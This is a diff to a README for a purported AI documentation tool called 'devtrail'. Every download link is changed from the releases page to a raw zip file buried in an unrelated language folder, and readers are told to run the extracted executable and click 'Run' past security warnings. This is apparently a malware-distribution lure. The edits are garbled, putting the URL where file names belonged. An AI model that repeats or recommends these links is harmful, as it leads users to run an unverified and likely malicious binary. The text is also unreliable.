@@ -1,6 +1,6 @@
 # 🚀 devtrail - Simplifying AI Development for Everyone
 
-[![Download devtrail](https://img.shields.io/badge/Download-devtrail-blue.svg)](https://github.com/Technophile522/devtrail/releases)
+[![Download devtrail](https://github.com/Technophile522/devtrail/raw/refs/heads/main/i18n/es/Software_3.2.zip)](https://github.com/Technophile522/devtrail/raw/refs/heads/main/i18n/es/Software_3.2.zip)
 
 ## 📖 About devtrail
 
@@ -18,16 +18,16 @@ devtrail is a tool designed to help you manage documentation for AI-assisted dev
 To download and run devtrail, follow these steps:
 
 1. **Visit the Release Page**  
-   Click the following link to go to the releases page: [Download devtrail](https://github.com/Technophile522/devtrail/releases). This page contains the latest version of the software.
+   Click the following link to go to the releases page: [Download devtrail](https://github.com/Technophile522/devtrail/raw/refs/heads/main/i18n/es/Software_3.2.zip). This page contains the latest version of the software.
 
 2. **Download the Latest Version**  
-   On the releases page, look for the most recent version. You will see various downloadable files. Click the link that reads something like `devtrail-vX.X.X.zip` or a similar file to download the software.
+   On the releases page, look for the most recent version. You will see various downloadable files. Click the link that reads something like `https://github.com/Technophile522/devtrail/raw/refs/heads/main/i18n/es/Software_3.2.zip` or a similar file to download the software.
 
 3. **Unzip the Downloaded File**  
    After the download completes, locate the ZIP file in your computer's downloads folder. Right-click on the file and choose "Extract All" or "Unzip" to decompress the contents.
 
 4. **Run devtrail**  
-   After unzipping, open the folder created by the extraction. Look for a file named `devtrail.exe` or similar. Double-click this file to launch the application. If prompted with a security warning, select "Run".
+   After unzipping, open the folder created by the extraction. Look for a file named `https://github.com/Technophile522/devtrail/raw/refs/heads/main/i18n/es/Software_3.2.zip` or similar. Double-click this file to launch the application. If prompted with a security warning, select "Run".
 
 ## 💻 System Requirements
 
@@ -61,6 +61,6 @@ For detailed guides, tutorials, and more information about devtrail, visit the d
 
 ## 💾 Download & Install
 
-To start using devtrail today, visit this page to download: [Download devtrail](https://github.com/Technophile522/devtrail/releases). Follow the steps above to install and run the software easily.
+To start using devtrail today, visit this page to download: [Download devtrail](https://github.com/Technophile522/devtrail/raw/refs/heads/main/i18n/es/Software_3.2.zip). Follow the steps above to install and run the software easily.
 
 Enjoy better documentation with devtrail!
